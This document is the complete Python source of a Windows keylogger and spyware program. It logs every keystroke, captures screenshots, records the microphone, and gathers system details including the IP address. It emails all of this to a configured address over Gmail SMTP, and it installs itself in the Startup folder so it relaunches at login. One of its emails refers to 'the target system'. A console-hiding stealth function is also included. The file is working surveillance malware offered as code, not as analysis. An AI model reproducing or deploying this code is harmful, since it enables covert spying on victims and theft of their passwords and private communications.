from email import encoders                      #used to encode various parts of the email eg: attachments
from email.mime.base import MIMEBase            #base class for MIME objects
from email.mime.image import MIMEImage          #used for representing image attachments in email messages.
from email.mime.multipart import MIMEMultipart  #used for creating multipart email messages
from email.mime.text import MIMEText            #used for representing text in email messages.
import os                                       #It provides functions for interacting with the operating system
import platform                                 #It provides functions for accessing information about the underlying platform
import smtplib                                  #It provides functions for sending email using the Simple Mail Transfer Protocol (SMTP).
import socket                                   #It provides functions for working with network sockets
import time                                     #It provides functions for working with time
import wave                                     #It provides functions for reading and writing WAV audio files.
import pyscreenshot                             #It provides functions for taking screenshots .
import win32console                             #It provides access to the Windows console API for manipulating console windows and text output
import win32gui                                 #It provides access to the Windows Graphical User Interface (GUI) API for manipulating GUI 
# from PIL import Image                         #It provides functions for working with images(used in this case to convert jpg to pdf).
import pyautogui                                #It provides functions for automating mouse and keyboard actions on the screen.
from pynput.keyboard import Key, Listener       #pynput is a library for monitoring and controlling input devices such as keyboards and mice.
import random,string
import sounddevice as sd
import getpass                                  #securely reading passwords and other sensitive information from the user
from dotenv import load_dotenv

load_dotenv()
inpkeys = []
pics_names = []
prev_length = 0 
fromaddr = os.environ.get('fromaddr')
toaddr = os.environ.get('toaddr')
password = os.environ.get('password')
msg = MIMEMultipart()
msg["From"] = fromaddr
msg["To"] = toaddr
msg["Subject"] = "Keylogger Report"
USER_NAME = getpass.getuser()

#This function is intended to add a file to the Windows startup folder,causing it to run automatically when the user logs into their Windows account. 
def add_to_startup(file_path=""):  # This function is used to 
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)

#It is a callback function that is intended to be called whenever a key is pressed.
def on_press(key):
    inpkeys.append(key)
    write_file(inpkeys)
    try:
        print('Alphanumeric key {0} pressed'.format(key.char))

    except AttributeError:
        print('Non-alphanumeric key {0} pressed'.format(key))

#This function is used to create a .txt file to store the key strokes
def write_file(inpkeys):
    with open('log.txt', 'w') as f:
        for key in inpkeys:
            k = str(key).replace("'", "")
            f.write(k)
            f.write(' ')

#It effectively hides the console window associated with the script when it's executed, making the script run in a "stealth" mode
def Stealth():
    win32console.FreeConsole()
    win32console.AllocConsole()  # Allocate console only once
    hwnd = win32console.GetConsoleWindow()  # Get console window handle
    win32gui.ShowWindow(hwnd, 0)  # SW_HIDE (hidden window)

#This function is used to take the screenshots of the entire windows screen
def ScreenShot():
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))  # Using timestamp as filename to ensure uniqueness
    pics_names.append(name)
    screenshot = pyscreenshot.grab()
    screenshot.save(name + '.jpg') 

    # Convert the screenshot to PDF
    # img = Image.open(name + '.jpg')
    # img.save(name + '.pdf', 'PDF')

def on_release(key):
    print('{0} released'.format(key))
   
#This function is used to send th mail of an attachment
def send_email(subject, body, attachment_path=None):
    msg = MIMEMultipart()
    msg["From"] = fromaddr
    msg["To"] = toaddr
    msg["Subject"] = subject

    msg.attach(MIMEText(body, 'plain'))  # Attach the plain text body to the message
    if attachment_path:     # Check if an attachment path is provided
        with open(attachment_path, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
        encoders.encode_base64(part)     # Encode the attachment using base64
        part.add_header('Content-Disposition', f'attachment; filename= {os.path.basename(attachment_path)}')
        msg.attach(part)
    with smtplib.SMTP('smtp.gmail.com', 587) as server:       # Connect to the SMTP server (Gmail) using TLS encryption
        server.starttls()
        server.login(fromaddr, password)
        server.sendmail(fromaddr, toaddr, msg.as_string())    
    print('new email function sent')

#This fuction is used to send the details of the of the user's OS 
def get_system_info():
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    info = {
        "Ip": ip,
        "Processor": platform.processor(),
        "System": platform.system(),
        "Machine": platform.machine(),
    }
    return "\n".join([f"{key}: {value}" for key, value in info.items()])
  
#This function is used to record the voice of the user useing the microphone
def record_audio():
    fs = 44100         # Define the sampling frequency (number of samples per second)
    seconds = 60
    obj = wave.open('sound.wav', 'w')
    obj.setnchannels(1)        # Set the number of audio channels (1 for mono)
    obj.setsampwidth(2)        # Set the sample width in bytes (2 bytes for 16-bit audio)
    obj.setframerate(fs)
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)      # Record audio using the sounddevice library
    sd.wait()
    obj.writeframesraw(myrecording)        # Write the raw audio data to the WAV file

def Mail_TxtFile():
    with open('log.txt', 'r') as file:
        attachment = MIMEText(file.read())
        attachment.add_header('Content-Disposition', 'attachment', filename='log.txt')
        msg.attach(attachment)

    with smtplib.SMTP('smtp.gmail.com:587') as server:
        server.starttls()
        server.login(fromaddr, password)
        server.sendmail(fromaddr, toaddr, msg.as_string())
    print('Sent Text file')      

#this function is used to send the SS in mail
def Mail_ScreenShot(pics_names):
    ScreenShot()
    screenshot_paths = []
    for pic in pics_names:
        # Capture and save the screenshot
        screenshot_path = pic + '.jpg'
        screenshot_paths.append(screenshot_path)
        pyautogui.screenshot(screenshot_path)

    # Attach screenshots to the email
    for screenshot_path in screenshot_paths:
        with open(screenshot_path, 'rb') as image_file:
            attachment = MIMEImage(image_file.read())
            attachment.add_header('Content-Disposition', 'attachment', filename=os.path.basename(screenshot_path))
            msg.attach(attachment)

    # Send the email
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(fromaddr, password)
        server.sendmail(fromaddr, toaddr, msg.as_string())
    print('Sent screenshot files')




def get_keys():
    with open('log.txt', 'r') as file:
        text = file.read()
    return text
# info_count=0
# key_count = 0

def main():
    prev_length = 0 
    with Listener(on_press=on_press, on_release=on_release) as listener:
        while True:
            try:
                curr_length = len(get_keys()) # get the length of the text in the log.txt file
                if curr_length > prev_length:
                  Mail_TxtFile()
                  prev_length = curr_length
                record_audio()
                send_email("Audio Log", "Audio recording from the target system.", "sound.wav")
               
                Mail_ScreenShot( pics_names)

                # os.remove(screenshot_path)
                # time.sleep(300)  # Send email every 5 minutes

            except Exception as e:
                print(f"An error occurred: {e}")
                time.sleep(60)  # Retry after a minute


if __name__ == "__main__":
    add_to_startup()
    send_email("System Info", get_system_info())
    main()

# with Listener(on_press=on_press, on_release=on_release) as listener:
#     while True:
#         try:
#             # Your main code that generates log entries
#             if info_count == 0:
#                 Mail_PcInfo()
#                 info_count +=1
#             key_count += 1
#             Mail_audio()
#             # Check if the length of log.txt has increased since the last check
#             curr_length = len(get_keys())
#             if curr_length > prev_length:
#                 Mail_TxtFile()
#                 prev_length = curr_length
#                  # Reset the buffer
#             ScreenShot()
#             Mail_ScreenShot( pics_names)
#             if key_count >= 30:
#                 key_count = 0

#             Stealth()
#             # Wait for 20 seconds
#             time.sleep(20)

#         except Exception as e:
#             print(f"An error occurred: {e}")
#             time.sleep(20)